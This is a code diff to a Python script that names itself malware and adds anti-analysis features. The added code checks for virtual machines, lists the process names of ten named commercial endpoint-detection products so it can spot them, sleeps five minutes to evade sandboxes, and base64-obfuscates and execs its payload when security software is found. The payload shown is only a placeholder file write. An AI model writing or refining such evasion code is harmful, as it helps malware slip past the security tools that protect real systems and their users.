@@ -36,44 +36,56 @@ def collect_network_info():
     return connections
 
 def is_virtualized():
-    # Check for hypervisor signatures in system files
+    try:
+        output = subprocess.check_output("systemd-detect-virt", shell=True)
+        if output.decode().strip() != "none":
+            return True, output.decode().strip()
+    except subprocess.CalledProcessError:
+        pass
+    
     virtualization_signatures = [
         "/sys/class/dmi/id/product_name",
         "/proc/scsi/scsi",
         "/sys/hypervisor/uuid",
         "/sys/class/dmi/id/sys_vendor"
     ]
+    
     for file in virtualization_signatures:
         if os.path.exists(file):
             with open(file, "r") as f:
                 content = f.read().lower()
                 if any(keyword in content for keyword in ["vmware", "virtualbox", "kvm", "hyper-v", "qemu", "xen"]):
-                    return True
-
-    # Additional check using system command for hypervisor
-    try:
-        output = subprocess.check_output("systemd-detect-virt", shell=True)
-        if output.decode().strip() != "none":
-            return True
-    except subprocess.CalledProcessError:
-        pass
-
-    return False
+                    return True, content.strip()
+    
+    return False, ""
 
 def detect_edr_processes():
-    edr_process_names = ['edr_process_name1', 'edr_process_name2']  # Replace with actual EDR process names
+    edr_process_names = {
+        "CrowdStrike Falcon": ["csagent.exe", "falcond.exe"],
+        "Carbon Black": ["cb.exe", "cbdefense.exe", "carbonblack.exe"],
+        "SentinelOne": ["SentinelAgent.exe", "SentinelAgentService.exe"],
+        "Symantec Endpoint Protection": ["smc.exe", "ccSvcHst.exe"],
+        "Microsoft Defender for Endpoint": ["SenseCncProxy.exe", "MsSense.exe"],
+        "McAfee Endpoint Security": ["McShield.exe", "mfetp.exe"],
+        "Palo Alto Networks Cortex XDR": ["cyserver.exe", "cyendpoint.exe"],
+        "FireEye Endpoint Security": ["xagt.exe"],
+        "Sophos": ["SophosMcsAgent.exe", "SophosMcsClient.exe"],
+        "Bitdefender GravityZone": ["epsecurityservice.exe", "bdservicehost.exe"]
+    }
+    
+    detected_edr = []
     for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] in edr_process_names:
-            return True
-    return False
+        for edr, processes in edr_process_names.items():
+            if proc.info['name'].lower() in [p.lower() for p in processes]:
+                detected_edr.append({"edr_name": edr, "process_name": proc.info['name'], "pid": proc.info['pid']})
+    
+    return detected_edr
 
-def detect_network_security():
-    # Example: Check for common firewall or IDS services
-    network_security_tools = ['firewalld', 'ufw', 'snort', 'suricata']
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] in network_security_tools:
-            return True
-    return False
+def detect_physical_server():
+    is_virtual, _ = is_virtualized()
+    if not is_virtual:
+        return True, "No virtualization detected"
+    return False, ""
 
 def collect_all_data():
     data = {}
@@ -81,8 +93,9 @@ def collect_all_data():
     data['system_info'] = collect_system_info()
     data['process_info'] = collect_process_info()
     data['network_info'] = collect_network_info()
-    data['edr_present'] = detect_edr_processes()
-    data['network_security'] = detect_network_security()
+    data['edr_detected'] = detect_edr_processes()
+    data['is_virtualized'], data['virtualization_info'] = is_virtualized()
+    data['is_physical'], data['physical_info'] = detect_physical_server()
     return data
 
 def save_data_to_file(data, filename='collected_data.json'):
@@ -115,12 +128,42 @@ def adapt_behavior_and_execute_payload(data):
     if data['system_info']['is_virtual']:
         print("Detected virtual environment. Adapting payload...")
         # Example adaptation: delay execution or modify payload behavior
-    if data['edr_present']:
-        print("Detected EDR presence. Attempting to bypass...")
-        # Example bypass: obfuscate payload or change delivery method
+        delay_execution()
+
+    if data['edr_detected']:
+        print(f"Detected EDR presence: {[edr['edr_name'] for edr in data['edr_detected']]}. Attempting to obfuscate payload...")
+        # Example obfuscation
+        payload_code = """
+def execute_payload():
+    try:
+        with open("payload_execution.txt", "a") as f:
+            f.write("Obfuscated payload executed.")
+    except Exception as e:
+        print(f"Payload execution failed: {e}")
+execute_payload()
+"""
+        obfuscated_payload = obfuscate_payload(payload_code)
+        exec(obfuscated_payload)
+        return
 
     # Execute the payload after adapting to the environment
     execute_payload()
+
+def delay_execution():
+    # Delay the execution to evade sandbox detection
+    import time
+    print("Delaying execution...")
+    time.sleep(300)  # Delay for 5 minutes
+    print("Resuming execution...")
+
+def obfuscate_payload(payload_function):
+    # Basic obfuscation by encoding the payload function using Base64
+    encoded_payload = base64.b64encode(payload_function.encode('utf-8')).decode('utf-8')
+    obfuscated_code = f"""
+import base64
+exec(base64.b64decode("{encoded_payload}").decode('utf-8'))
+"""
+    return obfuscated_code
 
 def run_malware():
     # Run the malware payload in a separate process
